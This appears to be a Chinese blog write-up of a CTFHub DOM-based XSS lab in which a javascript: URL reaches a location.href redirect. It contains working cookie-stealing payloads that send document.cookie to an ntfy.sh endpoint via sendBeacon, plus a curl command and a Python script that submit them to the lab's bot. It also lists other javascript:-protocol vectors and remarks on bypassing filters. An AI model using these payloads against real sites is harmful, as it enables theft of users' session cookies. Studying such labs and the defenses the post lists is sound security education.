---
layout: post
title: CTFHub - XSS DOM JumpTo Writeup
platform: ctfhub
date: 2026-10-23 14:47:00 +0800
categories: CTF
---

CTFHub - XSS DOM JumpTo Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **XSS** → DOM 型 XSS - JumpTo）
- 题型：Web
- 考点：**`javascript:` 协议**、`location.href` 跳转 sink、URL 编码陷阱
 

```text
页面标题：CTFHub 技能学习 | XSS DOM JumpTo ?
表单是一个【disabled】的 JumpTo 输入框（说明不靠表单输入）

★ 漏洞代码（页面源码）：

    <script>
        var target = location.search.split("=")
        if (target[0].slice(1) == "jumpto") {
            location.href = target[1];          ← ★ 把 URL 参数直接当跳转地址
        }
    </script>

    URL 有 ?jumpto=XXX 时，就把 location.href 设为 XXX
    → 传 javascript:代码 就能执行 JS

★ 第一次尝试（失败）：

    ?jumpto=javascript%3Afetch%28%27https%3A%2F%2Fntfy.sh%2Fxxx%27...
    （URL 编码后的 payload）

    → 60 秒没收到任何消息 ❌

    ★ 原因：location.search 返回的是【编码后的原始 query 字符串】
      target[1] = "javascript%3Afetch%28..."（带 % 号）
      location.href = 这个字符串 → 不是有效协议 → 什么都不发生

    ★ 教训：这里的 payload 不能 URL 编码！

★ 第二次尝试（成功）：

    ?jumpto=javascript:navigator.sendBeacon('https://ntfy.sh/xxx',document.cookie)
    （原样传，不编码）

    → 5 秒内收到：
        flag=ctfhub{9ee47f7d4835b21a68bcc933}

★ 为什么要用 sendBeacon：

    ① 避开 { } —— 这两个字符 Chrome 会自动编码成 %7B %7D
       （用 fetch(url,{method:'POST'}) 就会中招）
    ② 避开 = —— 因为代码用 split("=") 切分，
       值里再有 = 就会被截断
    ③ sendBeacon(url, data) 直接发 POST，不需要对象字面量、不需要 =

flag         : ctfhub{9ee47f7d4835b21a68bcc933}
```

二、题目分析

**① 漏洞代码在干什么**

```javascript
var target = location.search.split("=")
//  假设 URL 是 ?jumpto=hello
//  location.search = "?jumpto=hello"
//  split("=")      = ["?jumpto", "hello"]
//  target[0]       = "?jumpto"
//  target[0].slice(1) = "jumpto"

if (target[0].slice(1) == "jumpto") {
    location.href = target[1];        // target[1] = "hello"
}
//  → 浏览器跳转到 hello
```

**攻击思路**：

```text
location.href = "javascript:alert(1)"
                            ↑
                  浏览器会执行这段 JS，而不是"跳转"

★ 这就是 javascript: 伪协议 —— 它可以放在 href/location 里执行代码
  类似的还有：
      javascript:alert(1)
      javascript:fetch(...)
      javascript:void(0)        （常见的"空链接"）
```

**为什么这是 DOM 型 XSS**：

```text
服务器返回的 HTML 里没有 payload
是【前端 JS】从 location.search 读取，再赋给 location.href
→ 危险 sink 在前端 → DOM 型
```

**② 第一个坑：不能 URL 编码**

```javascript
location.search
    → 返回的是原始 query 字符串，【不会自动解码】
    → "?jumpto=javascript%3Aalert%281%29"
    
    target[1] = "javascript%3Aalert%281%29"
    location.href = "javascript%3Aalert%281%29"
    → 浏览器认为这是个奇怪的相对路径 → 跳转失败 → 什么都不发生
```

**对比一下**：

| 场景 | location.search 的值 | 需要编码吗 |
|---|---|---|
| 后端读参数（`$_GET['x']`）| 服务器自动解码 | **要编码** |
| **前端读 `location.search`** | **保留原始编码** | **不要编码** |

**★ 这是 DOM 型 XSS 和反射型 XSS 的重要区别之一。**

**③ 第二个坑：`split("=")` 会截断**

```javascript
"?jumpto=javascript:alert(1=2)".split("=")
    → ["?jumpto", "javascript:alert(1", "2)"]
    → target[1] = "javascript:alert(1"     ← 被切断了
    → 语法错误
```

**所以 payload 里不能有任何 `=`。**

**这就排除了很多常见写法**：

```javascript
// ❌ 有 =
fetch('url',{body:'cookie='+document.cookie})
new Image().src = 'url?c='+document.cookie
location.href='url?c='+document.cookie
```

**④ 第三个坑：Chrome 会自动编码某些字符**

```text
URL 的 query 部分，Chrome 允许这些字符原样出现：
    ! $ & ' ( ) * + , - . / : ; = ? @ _ ~

会自动编码（变成 %XX）的：
    空格 " < > { } | \ ^ [ ] `

★ 所以我们的 payload 里不能有 { } " < > 空格
  → fetch('url',{method:'POST'})  里的 {} 会被编码 → 坏掉
```

**⑤ 解决方案：`navigator.sendBeacon()`**

```javascript
navigator.sendBeacon(url, data)
    → 发一个 POST 请求，body = data
    → 不需要对象字面量（没有 {}）
    → 不需要 =
    → 字符集安全：' ( ) , : / .
```

**完美符合三个约束**：

```
✅ 没有 =        （不会被 split 截断）
✅ 没有 { }      （不会被 Chrome 编码）
✅ 没有空格/引号以外的特殊字符
```

三、解题步骤

**第 1 步：确认漏洞点**

```
浏览器访问：
    http://challenge-xxx:10800/?jumpto=javascript:alert(1)

→ 弹窗          ← 漏洞确认

★ 注意：这里不要编码！直接原样写在地址栏
```

**如果没弹窗**，检查：

```
□ 是不是用了 URL 编码（%3A 之类）→ 去掉，用原样
□ 是不是写成了 ?target= → 必须是 ?jumpto=
□ alert 有没有被过滤
```

**第 2 步：准备接收端**

```
新标签页打开：
    https://ntfy.sh/你的随机topic
```

**第 3 步：构造外带 payload**

```javascript
javascript:navigator.sendBeacon('https://ntfy.sh/你的topic',document.cookie)
```

**检查三件事**：

```
✅ 没有 = 号
✅ 没有 { } 
✅ 没有空格
```

**第 4 步：拼成完整 URL（不编码！）**

```
http://challenge-xxx:10800/?jumpto=javascript:navigator.sendBeacon('https://ntfy.sh/你的topic',document.cookie)
```

**★ 这里的关键是"原样拼接"**，不要 `urllib.parse.quote`。

**第 5 步：提交给 Bot**

```bash
curl -X POST "http://challenge-xxx:10800/submit" \
     -H "Content-Type: application/json" \
     -d '{"url":"http://challenge-xxx:10800/?jumpto=javascript:navigator.sendBeacon('"'"'https://ntfy.sh/xxx'"'"',document.cookie)"}'
```

**或者更简单：直接在页面的 "Send URL to Bot" 输入框里粘贴这个 URL，点 Send**

```
★ 这题不需要编码，所以完全可以手工粘贴
```

**第 6 步：读接收端**

```bash
curl "https://ntfy.sh/你的topic/json?poll=1"
```

**收到**：

```json
{"event":"message","message":"flag=ctfhub{9ee47f7d4835b21a68bcc933}"}
```

**🎉 flag 到手**

**第 7 步：提交 → 通关**

---

**手工操作（完全不需要脚本）**

```
① 打开 https://ntfy.sh/myctf_jump_abc123  （接收端）

② 在题目页面的 "Send URL to Bot" 输入框里粘贴：

   http://challenge-8001cd9754bec56c.sandbox.ctfhub.com:10800/?jumpto=javascript:navigator.sendBeacon('https://ntfy.sh/myctf_jump_abc123',document.cookie)

   ★ 注意：把 challenge-8001cd9754bec56c 换成你当前的域名
   ★ 注意：整段原样粘贴，不要编码

③ 点 【Send】

④ 切到 ntfy 页面 → 5 秒内看到 flag
```

**★ 这题是 XSS 系列里最容易手工做的一题** —— 因为 payload 不需要编码。

---

**完整脚本（实测用的）**

```python
import ssl, json, urllib.request, time, random, string

base  = "http://challenge-xxx:10800"
TOPIC = "ctfhub_jump_" + "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
NTFY  = "https://ntfy.sh/" + TOPIC

# ① 构造 payload（不编码、无 = 、无 {}）
payload = "javascript:navigator.sendBeacon('%s',document.cookie)" % NTFY
url = base + "/?jumpto=" + payload          # ★ 原样拼接

# ② 提交给 Bot
body = json.dumps({"url": url}).encode()
req = urllib.request.Request(base + "/submit", data=body, method="POST",
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read())

# ③ 轮询
for i in range(12):
    time.sleep(5)
    r = urllib.request.urlopen(NTFY + "/json?poll=1")
    for line in r.read().decode().split("\n"):
        if '"event":"message"' in line:
            print(json.loads(line)["message"])
            exit()
```

**实测输出**：

```
{"code": 0, "msg": "Successfully"}
flag=ctfhub{9ee47f7d4835b21a68bcc933}
```

四、延伸知识

**① `javascript:` 伪协议的利用场景**

```html
<!-- HTML 里的链接 -->
<a href="javascript:alert(1)">click</a>

<!-- 表单 action -->
<form action="javascript:alert(1)">

<!-- iframe src（现代浏览器多已禁止） -->
<iframe src="javascript:alert(1)">

<!-- JS 里的跳转 -->
location.href = "javascript:alert(1)"
location = "javascript:alert(1)"
window.open("javascript:alert(1)")

<!-- 属性注入（配合 XSS） -->
<img src=x onerror="location='javascript:alert(1)'">
```

**★ 很多 WAF 只过滤 `<script>` 和 `onerror`，不管 `javascript:`，所以常用来绕过。**

**② DOM 型 XSS 的常见 sink（危险接收点）**

| sink | 说明 | 例子 |
|---|---|---|
| `location.href` / `location` | 可执行 `javascript:` | 本题 |
| `location.assign()` / `replace()` | 同上 | |
| `window.open()` | 新窗口打开 `javascript:` | |
| `innerHTML` / `outerHTML` | 解析 HTML | 上一题 |
| `document.write()` | 写文档流 | |
| `eval()` / `Function()` | 执行字符串 | |
| `setTimeout(str)` / `setInterval(str)` | 传字符串会 eval | |
| `element.setAttribute('href', x)` | `javascript:` | |
| jQuery `$()` / `.html()` / `.append()` | 解析 HTML | |

**③ DOM 型 XSS 的三个"读源"**

```text
输入从哪来（source）：
    ① location.search     ← ?a=b        （本题）
    ② location.hash       ← #a=b
    ③ location.pathname   ← /a/b
    ④ document.referrer
    ⑤ window.name
    ⑥ postMessage 的数据
    ⑦ localStorage / sessionStorage
    ⑧ 用户输入（input.value）

危险去哪（sink）：见上表
★ 有 source + sink + 没有过滤 → DOM XSS
```

**④ 为什么 `location.hash` 更常被利用**

```text
URL 的 # 后面部分（hash / fragment）
    ★ 不会发送到服务器！
    → 服务端日志、WAF 都看不到
    → 只有浏览器端 JS 能读（location.hash）

所以很多 DOM XSS 用 hash：
    http://site/#<img src=x onerror=alert(1)>
    JS: el.innerHTML = location.hash.slice(1)
    
★ 这种攻击服务端完全看不到，只能靠前端防护
```

**⑤ 关于 URL 编码的重要区别（本题最大的坑）**

| 场景 | 服务端/前端拿到的值 | 要不要编码 |
|---|---|---|
| 后端读 `$_GET['x']` / `request.args` | 自动解码后的原文 | 要编码（否则特殊字符破坏 URL）|
| **前端读 `location.search`** | **原始编码字符串** | **不要编码** |
| 前端读 `location.hash` | 原始编码字符串 | 不要编码（除非手动 decode）|
| `URLSearchParams` | **自动解码** | 要编码 |

```javascript
// 举个对比：
location.search              → "?a=%3Cimg%3E"    （原始，带编码）
new URLSearchParams(location.search).get('a')  → "<img>"    （已解码）
decodeURIComponent(location.search)            → "?a=<img>" （解码了）
```

**★ 本题代码用的是 `location.search.split("=")`，没有解码 → 所以不能编码。**
**如果代码用的是 `URLSearchParams`，那就必须编码。**

**⑥ 防护**

```text
· ★ 不要用 location.href 直接跳转到用户输入
    改用白名单：
    
    const allow = ['https://a.com', 'https://b.com']
    if (allow.includes(target)) location.href = target
    
    或者只允许 http/https：
    if (/^https?:\/\//.test(target)) location.href = target
    （这样 javascript: 就被挡了）

· 用 textContent 代替 innerHTML
· 避免 eval / Function / setTimeout(字符串)
· Cookie 加 HttpOnly
· CSP：script-src 'self'（禁止内联脚本）
```

五、总结

- **本题核心：`location.href = location.search.split("=")[1]` → 传 `?jumpto=javascript:...` 就能执行 JS。**
- 成功的 payload：

```
?jumpto=javascript:navigator.sendBeacon('https://ntfy.sh/<topic>',document.cookie)
```

- **三个必记的坑**：

```text
① ★ 不能 URL 编码！
   location.search 返回原始编码字符串，JS 不会自动解码
   → payload 必须原样传

② ★ payload 里不能有 =
   代码用 split("=") 切分，值里再有 = 就会被截断

③ ★ 避开 Chrome 会自动编码的字符：{ } " < > 空格
   → 所以用 sendBeacon(url, data) 而不是 fetch(url, {method:...})
```

- **`sendBeacon` 是这题的最优解**：

```javascript
navigator.sendBeacon(url, data)
// 无 {}、无 =、字符安全，直接发 POST
```

- **实测 flag**：

```text
ctfhub{9ee47f7d4835b21a68bcc933}
```

**手工复现要点**：

```text
· 这题最容易手工做 —— payload 不用编码，直接粘到 "Send URL to Bot" 就行
· 先在地址栏试 ?jumpto=javascript:alert(1) 确认漏洞
· 换成 sendBeacon 版本，配上 ntfy 接收端
· 关键口诀：
    不编码、不用等号、不用花括号
```

**面试/实战记忆点**：

```text
┌────────────────────────────────────────────────────────┐
│  location.search 是【原始编码】的，不是解码后的          │
│  → DOM XSS 的 payload 常常不能 URL 编码                 │
│                                                        │
│  javascript: 伪协议可以绕过只过滤 <script> 的 WAF        │
│                                                        │
│  sendBeacon 是"无字面量对象"的 POST 方式，             │
│  在严格的字符限制下特别好用                              │
└────────────────────────────────────────────────────────┘
```
